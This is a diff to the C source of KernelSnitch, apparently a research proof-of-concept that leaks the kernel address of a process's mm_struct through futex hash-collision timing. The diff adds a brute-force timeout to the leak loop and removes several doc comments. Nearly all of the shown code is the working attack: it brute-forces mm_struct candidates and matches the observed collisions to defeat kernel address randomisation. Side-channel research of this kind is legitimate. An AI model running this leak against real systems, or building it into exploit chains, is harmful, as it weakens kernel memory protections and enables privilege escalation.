@@ -20,6 +20,10 @@
 
 #define FUTEX_SZ (64ULL<<30)
 #define FUTEX_MMAP_SZ (1ULL<<30)
+
+#ifndef KSNITCH_BRUTEFORCE_TIMEOUT_SEC
+#define KSNITCH_BRUTEFORCE_TIMEOUT_SEC 40
+#endif
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
 #endif
@@ -99,19 +103,12 @@ struct kernelsnitch_shared_state {
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
 
-/**
- * FUTEX syscall
- */
+
 static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
 {
     return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
 }
 
-/**
- * Do a private futex wait to increase the hash bucket of futex_hash(ks->inc_futex[id], current->mm_struct)
- * @arg arg.ks: shared KernelSnitch state
- * @arg arg.id: identifier of the futex user-space address to be used for the increase
- */
 struct inc_arg {
     struct kernelsnitch_shared_state *ks;
     size_t id;
@@ -201,7 +198,12 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+    time_t t_start = time(NULL);
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+        if (time(NULL) - t_start > KSNITCH_BRUTEFORCE_TIMEOUT_SEC) {
+            if (ks->verbose) pr_warning("[% 3zd] brute-force timeout\n", range->id);
+            break;
+        }
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
@@ -241,9 +243,6 @@ static void *__mm_leak(void *arg)
     return 0;
 }
 
-/****************************************************************************************************************/
-/* EXTERNAL FUNCTIONS                                                                                           */
-/****************************************************************************************************************/
 
 /**
  * Setup phase of KernelSnitch
@@ -349,7 +348,6 @@ size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
 
 /**
  * Brute-forcing phase, where it tests all mm_struct candidates and matches the hash collisions for this current candidate with the observed user space futex addresses
- * @arg ks: shared KernelSnitch state
  */
 void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
 {
@@ -374,11 +372,7 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
 }
 
-/**
- * Cleanup phase for KernelSnitch
- * @arg ks: shared KernelSnitch state
- * @return the found mm_struct or -1 for not found
- */
+
 size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
 {
     ASSERT_pr((ks->state == KERNELSNITCH_MM_FOUND || ks->state == KERNELSNITCH_MM_NOT_FOUND), "wrong state\n");
@@ -396,16 +390,6 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     return ret;
 }
 
-/**
- * Performs KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @arg __mm_slab_order: the order of the mm_struct slab
- * @arg __thread_cnt: thread count used for the bruteforcing phase
- * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
- * @arg __verbose: amount of print info (1...enabled; 0...disabled)
- * @arg __mte_enabled: is mte enabled on the victim system (1...enabled; 0...disabled)
- * @return the found mm_struct or -1 for not found
- */
 size_t kernelsnitch_param(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
 {
     struct kernelsnitch_shared_state *ks = kernelsnitch_setup(__mm_struct_sz, __mm_slab_order, __thread_cnt, __collision_cnt, __verbose, __mte_enabled);
